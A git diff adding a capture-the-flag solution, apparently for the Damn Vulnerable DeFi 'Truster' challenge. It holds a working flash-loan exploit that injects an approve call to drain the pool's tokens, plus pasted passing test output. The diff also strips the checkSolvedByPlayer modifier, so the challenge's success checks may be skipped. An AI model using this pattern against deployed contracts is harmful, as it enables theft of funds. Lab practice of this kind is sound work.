@@ -50,9 +50,41 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_truster() public checkSolvedByPlayer {
-        
+    /*
+        run :
+        forge test --match-path test/truster/Truster.t.sol
+
+        result :
+        [⠆] Compiling...
+        No files changed, compilation skipped
+
+        Ran 2 tests for test/truster/Truster.t.sol:TrusterChallenge
+        [PASS] test_assertInitialState() (gas: 21984)
+        [PASS] test_truster() (gas: 68127)
+        Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 69.83ms (4.74ms CPU time)
+
+        Ran 1 test suite in 102.96ms (69.83ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
+    */
+    function test_truster() public {
+        vm.startPrank(player);
+
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            player,
+            TOKENS_IN_POOL
+        );
+
+        pool.flashLoan(0, player, address(token), data);
+
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+
+        vm.stopPrank();
+
+        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL);
+        assertEq(token.balanceOf(address(pool)), 0);
     }
+
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
